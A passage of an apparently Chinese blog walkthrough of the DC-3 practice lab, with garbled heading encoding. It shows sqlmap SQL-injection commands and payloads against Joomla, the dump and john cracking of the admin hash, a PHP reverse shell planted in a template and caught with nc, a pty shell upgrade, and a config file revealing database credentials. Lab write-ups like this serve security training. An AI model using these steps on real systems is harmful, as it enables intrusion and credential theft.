<h3 id="3-çˆ†è¡¨"><a href="#3-çˆ†è¡¨" class="headerlink" title="3.çˆ†è¡¨"></a>3.çˆ†è¡¨</h3><p><code>å®šä½åˆ°#__userè¡¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] </span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| <span class="comment">#__assets           |</span></span><br><span class="line">| <span class="comment">#__associations     |</span></span><br><span class="line">| <span class="comment">#__banner_clients   |</span></span><br><span class="line">| <span class="comment">#__banner_tracks    |</span></span><br><span class="line">| <span class="comment">#__banners          |</span></span><br><span class="line">| <span class="comment">#__bsms_admin       |</span></span><br><span class="line">| <span class="comment">#__bsms_books       |</span></span><br><span class="line">| <span class="comment">#__bsms_comments    |</span></span><br><span class="line">| <span class="comment">#__bsms_locations   |</span></span><br><span class="line">| <span class="comment">#__bsms_mediafiles  |</span></span><br><span class="line">| <span class="comment">#__bsms_message_typ |</span></span><br><span class="line">| <span class="comment">#__bsms_podcast     |</span></span><br><span class="line">| <span class="comment">#__bsms_series      |</span></span><br><span class="line">| <span class="comment">#__bsms_servers     |</span></span><br><span class="line">| <span class="comment">#__bsms_studies     |</span></span><br><span class="line">| <span class="comment">#__bsms_studytopics |</span></span><br><span class="line">| <span class="comment">#__bsms_teachers    |</span></span><br><span class="line">| <span class="comment">#__bsms_templatecod |</span></span><br><span class="line">| <span class="comment">#__bsms_templates   |</span></span><br><span class="line">| <span class="comment">#__bsms_timeset     |</span></span><br><span class="line">| <span class="comment">#__bsms_topics      |</span></span><br><span class="line">| <span class="comment">#__bsms_update      |</span></span><br><span class="line">| <span class="comment">#__categories       |</span></span><br><span class="line">| <span class="comment">#__contact_details  |</span></span><br><span class="line">| <span class="comment">#__content_frontpag |</span></span><br><span class="line">| <span class="comment">#__content_rating   |</span></span><br><span class="line">| <span class="comment">#__content_types    |</span></span><br><span class="line">| <span class="comment">#__content          |</span></span><br><span class="line">| <span class="comment">#__contentitem_tag_ |</span></span><br><span class="line">| <span class="comment">#__core_log_searche |</span></span><br><span class="line">| <span class="comment">#__extensions       |</span></span><br><span class="line">| <span class="comment">#__fields_categorie |</span></span><br><span class="line">| <span class="comment">#__fields_groups    |</span></span><br><span class="line">| <span class="comment">#__fields_values    |</span></span><br><span class="line">| <span class="comment">#__fields           |</span></span><br><span class="line">| <span class="comment">#__finder_filters   |</span></span><br><span class="line">| <span class="comment">#__finder_links_ter |</span></span><br><span class="line">| <span class="comment">#__finder_links     |</span></span><br><span class="line">| <span class="comment">#__finder_taxonomy_ |</span></span><br><span class="line">| <span class="comment">#__finder_taxonomy  |</span></span><br><span class="line">| <span class="comment">#__finder_terms_com |</span></span><br><span class="line">| <span class="comment">#__finder_terms     |</span></span><br><span class="line">| <span class="comment">#__finder_tokens_ag |</span></span><br><span class="line">| <span class="comment">#__finder_tokens    |</span></span><br><span class="line">| <span class="comment">#__finder_types     |</span></span><br><span class="line">| <span class="comment">#__jbsbackup_timese |</span></span><br><span class="line">| <span class="comment">#__jbspodcast_times |</span></span><br><span class="line">| <span class="comment">#__languages        |</span></span><br><span class="line">| <span class="comment">#__menu_types       |</span></span><br><span class="line">| <span class="comment">#__menu             |</span></span><br><span class="line">| <span class="comment">#__messages_cfg     |</span></span><br><span class="line">| <span class="comment">#__messages         |</span></span><br><span class="line">| <span class="comment">#__modules_menu     |</span></span><br><span class="line">| <span class="comment">#__modules          |</span></span><br><span class="line">| <span class="comment">#__newsfeeds        |</span></span><br><span class="line">| <span class="comment">#__overrider        |</span></span><br><span class="line">| <span class="comment">#__postinstall_mess |</span></span><br><span class="line">| <span class="comment">#__redirect_links   |</span></span><br><span class="line">| <span class="comment">#__schemas          |</span></span><br><span class="line">| <span class="comment">#__session          |</span></span><br><span class="line">| <span class="comment">#__tags             |</span></span><br><span class="line">| <span class="comment">#__template_styles  |</span></span><br><span class="line">| <span class="comment">#__ucm_base         |</span></span><br><span class="line">| <span class="comment">#__ucm_content      |</span></span><br><span class="line">| <span class="comment">#__ucm_history      |</span></span><br><span class="line">| <span class="comment">#__update_sites_ext |</span></span><br><span class="line">| <span class="comment">#__update_sites     |</span></span><br><span class="line">| <span class="comment">#__updates          |</span></span><br><span class="line">| <span class="comment">#__user_keys        |</span></span><br><span class="line">| <span class="comment">#__user_notes       |</span></span><br><span class="line">| <span class="comment">#__user_profiles    |</span></span><br><span class="line">| <span class="comment">#__user_usergroup_m |</span></span><br><span class="line">| <span class="comment">#__usergroups       |</span></span><br><span class="line">| <span class="comment">#__users            |</span></span><br><span class="line">| <span class="comment">#__utf8_conversion  |</span></span><br><span class="line">| <span class="comment">#__viewlevels       |</span></span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line">[21:54:04] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 93 <span class="built_in">times</span></span><br><span class="line">[21:54:04] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:54:04 /2020-08-21/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/tmp/DC3</span><br></pre></td></tr></table></figure>

<h3 id="4-çˆ†å­—æ®µ"><a href="#4-çˆ†å­—æ®µ" class="headerlink" title="4.çˆ†å­—æ®µ"></a>4.çˆ†å­—æ®µ</h3><p><code>ç°æœ‰å­—æ®µé€‰æ‹©é»˜è®¤1ï¼Œçº¿ç¨‹é€‰æ‹©10ï¼Œç›´æ¥çˆ†å‡ºå­—æ®µ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; --columns -p list[fullordering]</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 21:59:25 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:59:25] [INFO] fetched random HTTP User-Agent header value &#x27;</span>Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8<span class="string">&#x27; from file &#x27;</span>/usr/share/sqlmap/data/txt/user-agents.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:59:25] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[21:59:25] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[21:59:26] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;</span>460ada11b31d3c5e5ca6e58fd5d3de27=ug2jkbpm6cl...hvfgeqmmq0<span class="string">&#x27;). Do you want to use those [Y/n] </span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: list[fullordering] (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8495,CONCAT(0x2e,0x7170786b71,(SELECT (ELT(8495=8495,1))),0x7170786b71),8473))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8890 FROM (SELECT(SLEEP(5)))cGDb)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[21:59:31] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.1</span></span><br><span class="line"><span class="string">[21:59:31] [INFO] fetching columns for table &#x27;</span><span class="comment">#__users&#x27; in database &#x27;joomladb&#x27;</span></span><br><span class="line">[21:59:32] [WARNING] unable to retrieve column names <span class="keyword">for</span> table <span class="string">&#x27;#__users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;joomladb&#x27;</span></span><br><span class="line"><span class="keyword">do</span> you want to use common column existence check? [y/N/q] y</span><br><span class="line">[21:59:54] [WARNING] <span class="keyword">in</span> <span class="keyword">case</span> of continuous data retrieval problems you are advised to try a switch <span class="string">&#x27;--no-cast&#x27;</span> or switch <span class="string">&#x27;--hex&#x27;</span></span><br><span class="line"><span class="built_in">which</span> common columns (wordlist) file <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] default <span class="string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span> (press Enter)</span><br><span class="line">[2] custom</span><br><span class="line">&gt; 1</span><br><span class="line">[22:00:00] [INFO] checking column existence using items from <span class="string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span></span><br><span class="line">[22:00:00] [INFO] adding words used on web page to the check list</span><br><span class="line">please enter number of threads? [Enter <span class="keyword">for</span> 1 (current)] 10</span><br><span class="line">[22:00:07] [INFO] starting 10 threads</span><br><span class="line">[22:00:07] [INFO] retrieved: id                                                                                                                                           </span><br><span class="line">[22:00:07] [INFO] retrieved: name                                                                                                                                         </span><br><span class="line">[22:00:07] [INFO] retrieved: username                                                                                                                                     </span><br><span class="line">[22:00:08] [INFO] retrieved: email                                                                                                                                        </span><br><span class="line">[22:00:11] [INFO] retrieved: password                                                                                                                                     </span><br><span class="line">[22:00:51] [INFO] retrieved: params                                                                                                                                       </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">Database: joomladb</span><br><span class="line">Table: <span class="comment">#__users</span></span><br><span class="line">[6 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| params   | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br><span class="line"></span><br><span class="line">[22:01:02] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2649 <span class="built_in">times</span></span><br><span class="line">[22:01:02] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 22:01:02 /2020-08-21/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="5-åˆ—ç›®å½•"><a href="#5-åˆ—ç›®å½•" class="headerlink" title="5.åˆ—ç›®å½•"></a>5.åˆ—ç›®å½•</h3><p><code>å¾—åˆ°äº†adminä¸åŠ å¯†å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -C &quot;name,password&quot; --dump -p list[fullordering]         </span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&quot;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 22:06:02 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:06:02] [INFO] fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE) AppleWebKit/523.13 (KHTML, like Gecko) Version/3.0 Safari/523.13&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span></span><br><span class="line"><span class="string">[22:06:02] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[22:06:02] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[22:06:02] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=8hrfk2ep2le...ioqrv6v505&#x27;). Do you want to use those [Y/n] </span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: list[fullordering] (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8495,CONCAT(0x2e,0x7170786b71,(SELECT (ELT(8495=8495,1))),0x7170786b71),8473))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8890 FROM (SELECT(SLEEP(5)))cGDb)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.1</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] fetching entries of column(s) &#x27;name, password&#x27; for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] retrieved: &#x27;admin&#x27;</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] retrieved: &#x27;<span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span>&#x27;</span></span><br><span class="line"><span class="string">Database: joomladb</span></span><br><span class="line"><span class="string">Table: #__users</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+-------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="string">| name  | password                                                     |</span></span><br><span class="line"><span class="string">+-------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="string">| admin | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span></span><br><span class="line"><span class="string">+-------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:06:04] [INFO] table &#x27;joomladb.`#__users`&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.5/dump/joomladb/#__users.csv&#x27;</span></span><br><span class="line"><span class="string">[22:06:04] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 6 times</span></span><br><span class="line"><span class="string">[22:06:04] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 22:06:04 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC3#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x11-ä½¿ç”¨johnè§£å¯†"><a href="#0x11-ä½¿ç”¨johnè§£å¯†" class="headerlink" title="0x11.ä½¿ç”¨johnè§£å¯†"></a>0x11.ä½¿ç”¨johnè§£å¯†</h2><p><code>å¯†ç ï¼šsnoopy</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># john joomla_v3.7.0_</span></span><br><span class="line">joomla_v3.7.0_admin_hash.txt  joomla_v3.7.0_sqli.txt        </span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># john joomla_v3.7.0_admin_hash.txt </span></span><br><span class="line">Created directory: /root/.john</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">snoopy           (?)</span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2020-08-21 22:10) 3.448g/s 124.1p/s 124.1c/s 124.1C/s 123456..buster</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x12-ç™»å…¥"><a href="#0x12-ç™»å…¥" class="headerlink" title="0x12.ç™»å…¥"></a>0x12.ç™»å…¥</h2><h3 id="1-å‘ç°æ¨¡æ¿æ–‡ä»¶"><a href="#1-å‘ç°æ¨¡æ¿æ–‡ä»¶" class="headerlink" title="1.å‘ç°æ¨¡æ¿æ–‡ä»¶"></a>1.å‘ç°æ¨¡æ¿æ–‡ä»¶</h3><img src="/2020/08/22/DC-3/image-20200822105108208.png" class>

<h3 id="2-æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ç›®å½•"><a href="#2-æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ç›®å½•" class="headerlink" title="2.æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ç›®å½•"></a>2.æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ç›®å½•</h3><img src="/2020/08/22/DC-3/image-20200822105443495.png" class>

<h3 id="3-ç¼–è¾‘åå¼¹shellï¼ŒkaliåŸç”Ÿè‡ªå¸¦"><a href="#3-ç¼–è¾‘åå¼¹shellï¼ŒkaliåŸç”Ÿè‡ªå¸¦" class="headerlink" title="3.ç¼–è¾‘åå¼¹shellï¼ŒkaliåŸç”Ÿè‡ªå¸¦"></a>3.ç¼–è¾‘åå¼¹shellï¼ŒkaliåŸç”Ÿè‡ªå¸¦</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># locate webshell</span></span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.asp</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.aspx</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.jsp</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.php</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.pl</span><br><span class="line">/root/.cache/vmware/drag_and_drop/ZKHwFq/w3af/w3af/plugins/attack/payloads/webshell/webshell.py</span><br><span class="line">/usr/bin/webshells</span><br><span class="line">/usr/share/webshells</span><br><span class="line">/usr/share/doc/webshells</span><br><span class="line">/usr/share/doc/webshells/changelog.gz</span><br><span class="line">/usr/share/doc/webshells/copyright</span><br><span class="line">/usr/share/webshells/asp</span><br><span class="line">/usr/share/webshells/aspx</span><br><span class="line">/usr/share/webshells/cfm</span><br><span class="line">/usr/share/webshells/jsp</span><br><span class="line">/usr/share/webshells/laudanum</span><br><span class="line">/usr/share/webshells/perl</span><br><span class="line">/usr/share/webshells/php</span><br><span class="line">/usr/share/webshells/asp/cmd-asp-5.1.asp</span><br><span class="line">/usr/share/webshells/asp/cmdasp.asp</span><br><span class="line">/usr/share/webshells/aspx/cmdasp.aspx</span><br><span class="line">/usr/share/webshells/cfm/cfexec.cfm</span><br><span class="line">/usr/share/webshells/jsp/cmdjsp.jsp</span><br><span class="line">/usr/share/webshells/jsp/jsp-reverse.jsp</span><br><span class="line">/usr/share/webshells/perl/perl-reverse-shell.pl</span><br><span class="line">/usr/share/webshells/perl/perlcmd.cgi</span><br><span class="line">/usr/share/webshells/php/findsocket</span><br><span class="line">/usr/share/webshells/php/php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br><span class="line">/usr/share/webshells/php/qsd-php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/simple-backdoor.php</span><br><span class="line">/usr/share/webshells/php/findsocket/findsock.c</span><br><span class="line">/usr/share/webshells/php/findsocket/php-findsock-shell.php</span><br><span class="line">/var/lib/dpkg/info/webshells.list</span><br><span class="line">/var/lib/dpkg/info/webshells.md5sums</span><br><span class="line">/var/lib/dpkg/info/webshells.postinst</span><br><span class="line">/var/lib/dpkg/info/webshells.prerm</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p><code>ä½¿ç”¨/usr/share/webshells/php/php-reverse-shell.phpï¼Œå°†å†…å®¹å¤åˆ¶åˆ°modules.phpä¸­</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cp /usr/share/webshells/php/php-reverse-shell.php reverse.php</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/22/DC-3/image-20200822122034297.png" class>

<p><code>è®¿é—®å¾—åˆ°shell</code></p>
<img src="/2020/08/22/DC-3/image-20200822122220054.png" class>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.5] 45748</span><br><span class="line">Linux DC-3 4.4.0-21-generic <span class="comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line"> 14:21:43 up  3:26,  0 users,  load average: 0.00, 0.01, 0.05</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<h3 id="4-å¾—åˆ°äº¤äº’shell"><a href="#4-å¾—åˆ°äº¤äº’shell" class="headerlink" title="4.å¾—åˆ°äº¤äº’shell"></a>4.å¾—åˆ°äº¤äº’shell</h3><p><code>ä½¿ç”¨python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ <span class="built_in">cd</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-3:/$</span><br></pre></td></tr></table></figure>

<p><strong>é™„åŠ ï¼š</strong></p>
<p><code>å½“Ctrl+zé€€å‡ºshellæ—¶ï¼Œæˆ‘ä»¬å¦‚ä½•åå›å‘¢ï¼Ÿ</code></p>
<blockquote>
<p>1.å…ˆè¾“å…¥stty raw -echo</p>
<p>2.å†æŒ‰Back+f+g+enterï¼Œå³å¯è¿”å›shell</p>
<p>/å½“å‰shellä¸‹ä¸Šä¸‹ç®­å¤´å°±å¯ä»¥ä½¿ç”¨äº†/</p>
</blockquote>
<img src="/2020/08/22/DC-3/image-20200822124744850.png" class>

<h2 id="0x13-ææƒ"><a href="#0x13-ææƒ" class="headerlink" title="0x13.ææƒ"></a>0x13.ææƒ</h2><h3 id="1-å°è¯•ä½¿ç”¨sudo-l-ä½†æ²¡æœ‰æƒé™"><a href="#1-å°è¯•ä½¿ç”¨sudo-l-ä½†æ²¡æœ‰æƒé™" class="headerlink" title="1.å°è¯•ä½¿ç”¨sudo -l ä½†æ²¡æœ‰æƒé™"></a>1.å°è¯•ä½¿ç”¨sudo -l ä½†æ²¡æœ‰æƒé™</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br><span class="line">^Csudo: 1 incorrect password attempt</span><br><span class="line">www-data@DC-3:/$</span><br></pre></td></tr></table></figure>

<h3 id="2-æŸ¥çœ‹mysqlé…ç½®æ–‡ä»¶"><a href="#2-æŸ¥çœ‹mysqlé…ç½®æ–‡ä»¶" class="headerlink" title="2.æŸ¥çœ‹mysqlé…ç½®æ–‡ä»¶"></a>2.æŸ¥çœ‹mysqlé…ç½®æ–‡ä»¶</h3><p><code>æ‰¾åˆ°äº†mysqlçš„rootè´¦æˆ·å¯†ç ï¼Œç¢°ç¢°è¿æ°”ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç™»å…¥åˆ°ç³»ç»Ÿ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/var/www/html$ cat configuration.php </span><br><span class="line">&lt;?php</span><br><span class="line">class JConfig &#123;</span><br><span class="line">        public <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$offline_message</span> = <span class="string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;</span>;</span><br><span class="line">        public <span class="variable">$display_offline_message</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$offline_image</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sitename</span> = <span class="string">&#x27;DC-3&#x27;</span>;</span><br><span class="line">        public <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line">        public <span class="variable">$captcha</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">        public <span class="variable">$access</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$dbtype</span> = <span class="string">&#x27;mysqli&#x27;</span>;</span><br><span class="line">        public <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        public <span class="variable">$user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        public <span class="variable">$password</span> = <span class="string">&#x27;squires&#x27;</span>;</span><br><span class="line">        public <span class="variable">$db</span> = <span class="string">&#x27;joomladb&#x27;</span>;</span><br><span class="line">        public <span class="variable">$dbprefix</span> = <span class="string">&#x27;d8uea_&#x27;</span>;</span><br><span class="line">        public <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$secret</span> = <span class="string">&#x27;7M6S1HqGMvt1JYkY&#x27;</span>;</span><br><span class="line">        public <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$error_reporting</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line">        public <span class="variable">$helpurl</span> = <span 